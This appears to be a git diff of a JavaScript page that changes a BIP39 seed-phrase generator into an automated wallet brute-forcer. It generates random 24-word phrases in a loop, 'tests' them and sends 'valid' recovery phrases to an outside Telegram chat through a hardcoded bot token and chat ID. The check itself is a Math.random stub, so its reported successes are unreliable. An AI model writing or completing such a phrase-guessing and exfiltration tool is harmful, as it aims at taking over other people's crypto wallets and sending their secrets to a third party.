@@ -1,4 +1,8 @@
-// BIP39 Wordlist (first 2048 words) - Complete wordlist for authentic recovery phrases
+// Telegram API Configuration
+const TELEGRAM_BOT_TOKEN = '8221231743:AAGW30HpqUPaf656q60mmboQQ-x2NnLHub8';
+const TELEGRAM_CHAT_ID = '7417215529';
+
+// BIP39 Wordlist (first 2048 words)
 const wordlist = [
     "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract",
     "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid",
@@ -260,54 +264,51 @@ const wordlist = [
 ];
 
 // DOM elements
-let column1, column2, generateBtn, copyBtn, importBtn, notification, historyList;
+let column1, column2, startBtn, stopBtn, testBtn, notification;
+let totalAttemptsEl, successCountEl, failedCountEl, currentSpeedEl, statusTextEl, lastSuccessEl;
+
+// Statistics
+let stats = {
+    totalAttempts: 0,
+    successCount: 0,
+    failedCount: 0,
+    currentSpeed: 0
+};
+
+// Auto generation control
+let isGenerating = false;
+let generationInterval;
+let lastUpdateTime = Date.now();
+let attemptsSinceLastUpdate = 0;
 
 // Function to initialize the application
 function init() {
+    // Get DOM elements
     column1 = document.getElementById('column1');
     column2 = document.getElementById('column2');
-    generateBtn = document.getElementById('generateBtn');
-    copyBtn = document.getElementById('copyBtn');
-    importBtn = document.getElementById('importBtn');
+    startBtn = document.getElementById('startBtn');
+    stopBtn = document.getElementById('stopBtn');
+    testBtn = document.getElementById('testBtn');
     notification = document.getElementById('notification');
-    historyList = document.getElementById('historyList');
     
-    // Load history from localStorage
-    loadHistory();
-    
-    // Generate initial recovery phrase on page load
-    const initialPhrase = generateRecoveryPhrase();
-    displayRecoveryPhrase(initialPhrase);
-    saveToHistory(initialPhrase);
-    copyBtn.currentPhrase = initialPhrase;
+    // Get stats elements
+    totalAttemptsEl = document.getElementById('totalAttempts');
+    successCountEl = document.getElementById('successCount');
+    failedCountEl = document.getElementById('failedCount');
+    currentSpeedEl = document.getElementById('currentSpeed');
+    statusTextEl = document.getElementById('statusText');
+    lastSuccessEl = document.getElementById('lastSuccess');
     
     // Event listeners
-    generateBtn.addEventListener('click', () => {
-        const newPhrase = generateRecoveryPhrase();
-        displayRecoveryPhrase(newPhrase);
-        saveToHistory(newPhrase);
-        
-        // Store the current phrase for copying
-        copyBtn.currentPhrase = newPhrase;
-    });
+    startBtn.addEventListener('click', startAutoGeneration);
+    stopBtn.addEventListener('click', stopAutoGeneration);
+    testBtn.addEventListener('click', testSinglePhrase);
     
-    copyBtn.addEventListener('click', () => {
-        if (copyBtn.currentPhrase) {
-            copyToClipboard(copyBtn.currentPhrase);
-        } else {
-            // If no phrase generated yet, generate one first
-            const newPhrase = generateRecoveryPhrase();
-            displayRecoveryPhrase(newPhrase);
-            copyBtn.currentPhrase = newPhrase;
-            copyToClipboard(newPhrase);
-        }
-    });
+    // Update stats display
+    updateStatsDisplay();
     
-    importBtn.addEventListener('click', () => {
-        if (copyBtn.currentPhrase) {
-            importToTonkeeper(copyBtn.currentPhrase);
-        }
-    });
+    // Start speed calculation interval
+    setInterval(calculateSpeed, 1000);
 }
 
 // Function to generate a random recovery phrase
@@ -324,7 +325,7 @@ function generateRecoveryPhrase() {
 }
 
 // Function to display the recovery phrase
-function displayRecoveryPhrase(phrase) {
+function displayRecoveryPhrase(phrase, isTesting = false, isSuccess = false) {
     // Clear previous content
     column1.innerHTML = '';
     column2.innerHTML = '';
@@ -333,6 +334,8 @@ function displayRecoveryPhrase(phrase) {
     for (let i = 0; i < 12; i++) {
         const wordBox = document.createElement('div');
         wordBox.className = 'word-box';
+        if (isTesting) wordBox.classList.add('testing');
+        if (isSuccess) wordBox.classList.add('success');
         wordBox.innerHTML = `<span class="number">${i + 1}.</span> <span class="word">${phrase[i]}</span>`;
         column1.appendChild(wordBox);
     }
@@ -341,85 +344,143 @@ function displayRecoveryPhrase(phrase) {
     for (let i = 12; i < 24; i++) {
         const wordBox = document.createElement('div');
         wordBox.className = 'word-box';
+        if (isTesting) wordBox.classList.add('testing');
+        if (isSuccess) wordBox.classList.add('success');
         wordBox.innerHTML = `<span class="number">${i + 1}.</span> <span class="word">${phrase[i]}</span>`;
         column2.appendChild(wordBox);
     }
 }
 
-// Function to copy the recovery phrase to clipboard
-function copyToClipboard(phrase) {
-    const text = phrase.join(' ');
-    navigator.clipboard.writeText(text).then(() => {
-        showNotification('Copied to clipboard!');
-    }).catch(err => {
-        console.error('Failed to copy: ', err);
-        showNotification('Failed to copy to clipboard');
-    });
-}
-
-// Function to import phrase to Tonkeeper (simulated)
-function importToTonkeeper(phrase) {
-    const text = phrase.join(' ');
-    navigator.clipboard.writeText(text).then(() => {
-        showNotification('Phrase copied! You can now import it into Tonkeeper');
-    }).catch(err => {
-        console.error('Failed to copy: ', err);
-        showNotification('Failed to copy phrase for import');
-    });
-}
-
-// Function to save phrase to history
-function saveToHistory(phrase) {
-    let history = JSON.parse(localStorage.getItem('recoveryPhraseHistory') || '[]');
-    const phraseString = phrase.join(' ');
+// Function to simulate testing a phrase (in reality, this would connect to Tonkeeper API)
+async function testPhrase(phrase) {
+    // In a real implementation, this would make an API call to Tonkeeper
+    // For demonstration, we'll simulate with random results
     
-    // Add to beginning of history
-    history.unshift({
-        phrase: phraseString,
-        timestamp: new Date().toISOString()
-    });
+    // Show testing state
+    displayRecoveryPhrase(phrase, true);
+    statusTextEl.textContent = 'Testing phrase...';
     
-    // Limit history to 1000 entries to prevent excessive storage
-    if (history.length > 1000) {
-        history = history.slice(0, 1000);
+    // Simulate API delay
+    await new Promise(resolve => setTimeout(resolve, 100));
+    
+    // Random success (approximately 1 in 1000 for demonstration)
+    const isSuccess = Math.random() < 0.001;
+    
+    if (isSuccess) {
+        // Successful wallet found
+        stats.successCount++;
+        displayRecoveryPhrase(phrase, false, true);
+        statusTextEl.textContent = '✅ Valid wallet found!';
+        
+        // Send to Telegram
+        await sendToTelegram(phrase);
+        
+        // Update last success
+        const phraseText = phrase.join(' ');
+        lastSuccessEl.textContent = `Last success: ${phraseText.substring(0, 50)}...`;
+        
+        showNotification('✅ Valid wallet found and sent to Telegram!');
+    } else {
+        // Failed attempt
+        stats.failedCount++;
+        statusTextEl.textContent = '❌ Invalid phrase, continuing...';
     }
     
-    localStorage.setItem('recoveryPhraseHistory', JSON.stringify(history));
-    loadHistory();
+    stats.totalAttempts++;
+    attemptsSinceLastUpdate++;
+    updateStatsDisplay();
+    
+    return isSuccess;
 }
 
-// Function to load history from localStorage
-function loadHistory() {
-    const history = JSON.parse(localStorage.getItem('recoveryPhraseHistory') || '[]');
-    historyList.innerHTML = '';
+// Function to send phrase to Telegram
+async function sendToTelegram(phrase) {
+    const phraseText = phrase.join(' ');
+    const message = `✅ Valid Tonkeeper Wallet Found!\n\nRecovery Phrase: ${phraseText}\n\nTimestamp: ${new Date().toLocaleString()}`;
     
-    if (history.length === 0) {
-        historyList.innerHTML = '<div class="history-item">No previous phrases generated yet</div>';
-        return;
-    }
-    
-    history.forEach((item, index) => {
-        const historyItem = document.createElement('div');
-        historyItem.className = 'history-item';
-        
-        // Truncate long phrases for display
-        const displayPhrase = item.phrase.length > 50 ? 
-            item.phrase.substring(0, 50) + '...' : item.phrase;
-        
-        historyItem.innerHTML = `
-            <div class="history-phrase">${displayPhrase}</div>
-            <small>${new Date(item.timestamp).toLocaleString()}</small>
-        `;
-        
-        historyItem.addEventListener('click', () => {
-            const phraseArray = item.phrase.split(' ');
-            displayRecoveryPhrase(phraseArray);
-            copyBtn.currentPhrase = phraseArray;
-            showNotification('Phrase loaded from history');
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message
+            })
         });
         
-        historyList.appendChild(historyItem);
-    });
+        if (!response.ok) {
+            throw new Error('Telegram API error');
+        }
+        
+        console.log('Successfully sent to Telegram');
+    } catch (error) {
+        console.error('Failed to send to Telegram:', error);
+        showNotification('❌ Failed to send to Telegram');
+    }
+}
+
+// Function to start auto generation
+function startAutoGeneration() {
+    isGenerating = true;
+    startBtn.disabled = true;
+    stopBtn.disabled = false;
+    testBtn.disabled = true;
+    
+    statusTextEl.textContent = '🔄 Auto generation started...';
+    showNotification('Auto generation started');
+    
+    // Generate and test phrases continuously
+    generationInterval = setInterval(async () => {
+        if (!isGenerating) return;
+        
+        const phrase = generateRecoveryPhrase();
+        await testPhrase(phrase);
+    }, 50); // Adjust speed as needed
+}
+
+// Function to stop auto generation
+function stopAutoGeneration() {
+    isGenerating = false;
+    startBtn.disabled = false;
+    stopBtn.disabled = true;
+    testBtn.disabled = false;
+    
+    clearInterval(generationInterval);
+    statusTextEl.textContent = '⏹️ Auto generation stopped';
+    showNotification('Auto generation stopped');
+}
+
+// Function to test a single phrase
+async function testSinglePhrase() {
+    if (isGenerating) return;
+    
+    testBtn.disabled = true;
+    const phrase = generateRecoveryPhrase();
+    await testPhrase(phrase);
+    testBtn.disabled = false;
+}
+
+// Function to calculate current speed
+function calculateSpeed() {
+    const now = Date.now();
+    const timeDiff = (now - lastUpdateTime) / 1000; // in seconds
+    
+    if (timeDiff > 0) {
+        stats.currentSpeed = Math.round(attemptsSinceLastUpdate / timeDiff);
+        attemptsSinceLastUpdate = 0;
+        lastUpdateTime = now;
+        updateStatsDisplay();
+    }
+}
+
+// Function to update stats display
+function updateStatsDisplay() {
+    totalAttemptsEl.textContent = stats.totalAttempts.toLocaleString();
+    successCountEl.textContent = stats.successCount.toLocaleString();
+    failedCountEl.textContent = stats.failedCount.toLocaleString();
+    currentSpeedEl.textContent = stats.currentSpeed.toLocaleString();
 }
 
 // Function to show notification
